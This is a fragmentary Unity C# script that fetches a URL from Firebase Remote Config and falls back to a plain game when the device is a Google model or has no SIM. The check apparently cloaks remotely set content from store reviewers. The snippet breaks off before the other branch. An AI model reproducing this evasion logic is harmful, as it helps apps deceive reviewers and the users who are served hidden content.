...
{
    [SerializeField] private FBInitializer initializer;
    [SerializeField] private bool simDevice;
    [SerializeField] private TextMeshProUGUI urlText;

    private string _url, _brandDevice;
    ...
    private void Start()
    {
        _url = PlayerPrefs.GetString("key", "");
    ...
    private IEnumerator FirstStart()
    {
        ...
        {
            _url = FirebaseRemoteConfig.DefaultInstance.GetValue("url").StringValue;
            if (_url != "")
                PlayerPrefs.SetString("key", _url);
            urlText.text = _url;
        }
        LoadFire();
    }
    ...
    public void LoadFire()
    {
        ...
        _brandDevice = SystemInfo.deviceModel.ToLower();
        simDevice = GetSimStatus();
        if(_url == "" || _brandDevice.Contains("google") || !simDevice)
        {
            StartGame();
            return;
        }
